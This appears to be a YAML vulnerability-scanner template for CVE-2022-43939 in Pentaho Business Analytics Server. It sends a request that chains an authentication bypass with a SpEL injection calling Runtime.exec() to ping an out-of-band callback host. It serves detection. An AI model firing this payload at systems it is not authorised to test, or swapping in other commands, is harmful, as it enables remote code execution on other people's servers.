name: yaml-poc-hitachi-vantara_pentaho_business_analytics_server-other-CVE-2022-43939
binding: 87cecf84-3e2d-4248-9589-b6dd2318ba28
detail:
    author: jiapeng.han
    links:
        - http://packetstormsecurity.com/files/172296/Pentaho-Business-Server-Authentication-Bypass-SSTI-Code-Execution.html
        - https://support.pentaho.com/hc/en-us/articles/14455394120333--Resolved-Pentaho-BA-Server-Use-of-Non-Canonical-URL-Paths-for-Authorization-Decisions-Versions-before-9-4-0-1-and-9-3-0-2-including-8-3-x-Impacted-CVE-2022-43939-
    vulnerability:
        id: 42997d42-3cda-4782-b555-bbf4c983363a
        level: critical
    warning: Harmless
transport: http
set:
    reverse: newReverse()
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /pentaho/api/ldap/config/ldapTreeNodeChildren/require.js?url=%23{{T(java.lang.Runtime).getRuntime().exec('{ping {{reverse.url}}}')}}&mgrDn=a&pwd=a
            follow_redirects: false
        expression: response.status == 200 && reverse.wait(5)
expression: r0()
